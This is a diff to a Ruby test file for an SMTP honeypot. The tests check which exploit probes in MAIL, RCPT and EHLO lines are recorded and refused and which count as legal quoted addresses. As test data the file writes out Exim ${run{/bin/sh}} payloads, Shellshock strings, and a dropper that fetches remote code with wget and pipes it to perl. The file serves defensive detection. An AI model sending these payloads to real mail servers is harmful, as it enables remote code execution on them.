@@ -139,6 +139,7 @@ class SmtpHoneypotSessionTest < Minitest::Test
   def test_exploit_probe_is_recorded_and_refused_without_dispatch
     with_session(role: :mx, spec_extra: {}) do |client|
       read_reply(client)
+      command(client, "EHLO client.test")
       reply = command(client, "MAIL FROM:<${run{/bin/sh -c id}}@evil.test>")
       assert_match(/\A502/, reply, "probe must be refused, not dispatched as MAIL")
       command(client, "QUIT")
@@ -150,21 +151,127 @@ class SmtpHoneypotSessionTest < Minitest::Test
     assert_equal "exim_run", event[:signature]
   end
 
-  # The dropper shape seen against production: command substitution with no
-  # system path in it, smuggled through a quoted RCPT local-part. Recorded
-  # and refused before rcpt_to ever sees it.
-  def test_shell_dropper_in_rcpt_local_part_is_recorded_and_refused
+  # Inside a well-formed <path>, the same tokens are a legal quoted
+  # local-part (RFC 5321 lets one hold $ ( ) { } and backticks). The
+  # dropper shape seen against production rides a quoted RCPT local-part,
+  # and so would a real message to such an address relayed by any
+  # provider that preserves quoting - refusing (or, under
+  # protocol_auto_ban, banning) that relay for it would be a false
+  # positive. The path is the address parser's business: its normal
+  # answer, no event.
+  def test_quoted_local_part_inside_a_path_is_a_recipient_not_a_probe
     with_session(role: :mx, spec_extra: {}) do |client|
       read_reply(client)
-      command(client, "MAIL FROM:<hello@info.test>")
+      command(client, "EHLO client.test")
+      assert_match(/\A250/, command(client, "MAIL FROM:<hello@info.test>"))
       reply = command(client, 'RCPT TO:<"x: Service status change: localhost $(nohup wget -qO - ' \
                               'http://192.0.2.9/zed | perl &) changed from stopped to running"@cve.invalid>')
-      assert_match(/\A502/, reply, "probe must be refused, not dispatched as RCPT")
+      assert_match(/\A550 5\.7\.1 Relaying denied/, reply, "the normal RCPT answer, not the probe 502")
+      assert_match(/\A550 5\.7\.1 Relaying denied/, command(client, 'RCPT TO:<"${run{/bin/sh}}"@evil.test>'))
+      assert_match(/\A550 5\.7\.1 Relaying denied/, command(client, 'RCPT TO:<"() { :;}"@evil.test>'))
+      assert_match(/\A550 5\.1\.1 No such user here/, command(client, 'RCPT TO:<"$(wget http://x)"@example.test>'),
+                   "an unknown user in a hosted domain gets the usual 5.1.1, not a probe refusal")
+      command(client, "QUIT")
+    end
+
+    assert_empty @store.honeypot_events
+  end
+
+  def test_quoted_local_part_in_a_mail_from_path_is_a_sender_not_a_probe
+    with_session(role: :mx, spec_extra: {}) do |client|
+      read_reply(client)
+      command(client, "EHLO client.test")
+      assert_match(/\A250 2\.1\.0/, command(client, 'MAIL FROM:<"${run{/bin/sh -c id}}"@evil.test>'))
+      command(client, "QUIT")
+    end
+
+    assert_empty @store.honeypot_events
+  end
+
+  # The path is exempt, nothing else on the line is: an exploit token in
+  # the verb/parameter region of a MAIL/RCPT, or an argument that is not
+  # one RFC 5321 <path> (the real Exim payloads carry spaces, backslashes
+  # or quotes no unquoted local-part may), is still a probe.
+  def test_probe_outside_the_path_of_a_mail_or_rcpt_line_is_still_detected
+    with_session(role: :mx, spec_extra: {}) do |client|
+      read_reply(client)
+      command(client, "EHLO client.test")
+      assert_match(/\A502/, command(client, "MAIL FROM:<a@b.test> ${run{/bin/sh}}"))
+      command(client, "QUIT")
+    end
+
+    assert_equal 1, @store.honeypot_events.size
+    assert_equal "exim_run", @store.honeypot_events.first[:signature]
+  end
+
+  def test_unquoted_exploit_payloads_that_are_not_a_path_are_still_detected
+    [ 'RCPT TO:<${run{\x2Fbin\x2Fsh\t-c\t\x22wget http://x\x22}}@localhost>',
+      "RCPT TO:<${run{/bin/sh -c 'id'}}@localhost>",
+      'RCPT TO:<"unterminated $(wget http://x)@evil.test>',
+      "MAIL FROM:<() { :;}; /bin/sh@evil.test>" ].each do |probe|
+      setup
+      with_session(role: :mx, spec_extra: {}) do |client|
+        read_reply(client)
+        command(client, "EHLO client.test")
+        command(client, "MAIL FROM:<a@b.test>")
+        assert_match(/\A502/, command(client, probe), probe)
+        command(client, "QUIT")
+      end
+
+      assert_equal 1, @store.honeypot_events.size, probe
+      assert_equal "exploit_probe", @store.honeypot_events.first[:trigger], probe
+    end
+  end
+
+  def test_probe_in_a_helo_argument_is_still_detected
+    with_session(role: :mx, spec_extra: {}) do |client|
+      read_reply(client)
+      assert_match(/\A502/, command(client, "EHLO $(wget http://x)"))
       command(client, "QUIT")
     end
 
     assert_equal 1, @store.honeypot_events.size
     assert_equal "command_substitution", @store.honeypot_events.first[:signature]
+  end
+
+  # An 8-bit mailbox from a legacy relay is the address parser's 553/501
+  # (SMTPUTF8 not declared / not valid UTF-8), not garbage from a scanner.
+  def test_eight_bit_mailbox_inside_a_path_is_refused_by_the_parser_not_recorded_as_garbage
+    with_session(role: :mx, spec_extra: {}) do |client|
+      read_reply(client)
+      command(client, "EHLO client.test")
+      assert_match(/\A553 5\.6\.7/, command(client, "MAIL FROM:<r\xE9mi@x.test>".b))
+      assert_match(/\A250/, command(client, "MAIL FROM:<a@b.test>"))
+      assert_match(/\A553 5\.6\.7/, command(client, "RCPT TO:<r\xE9mi@example.test>".b))
+      command(client, "QUIT")
+    end
+
+    assert_empty @store.honeypot_events
+  end
+
+  def test_eight_bit_mailbox_under_smtputf8_is_the_parsers_501_not_garbage
+    with_session(role: :mx, spec_extra: {}) do |client|
+      read_reply(client)
+      command(client, "EHLO client.test")
+      assert_match(/\A501 5\.6\.7 Address is not valid UTF-8/, command(client, "MAIL FROM:<r\xE9mi@x.test> SMTPUTF8".b))
+      command(client, "QUIT")
+    end
+
+    assert_empty @store.honeypot_events
+  end
+
+  # A control byte inside the brackets is not a well-formed path, so the
+  # whole line is checked as before: recorded as garbage, and the parser's
+  # own 501 is still the reply.
+  def test_control_byte_inside_a_path_is_still_recorded_as_garbage
+    with_session(role: :mx, spec_extra: {}) do |client|
+      read_reply(client)
+      command(client, "EHLO client.test")
+      assert_match(/\A501/, command(client, "MAIL FROM:<a@b\x00.test>"))
+      command(client, "QUIT")
+    end
+
+    assert_equal "control_bytes", @store.honeypot_events.first[:signature]
   end
 
   def test_vrfy_root_reconnaissance_is_flagged
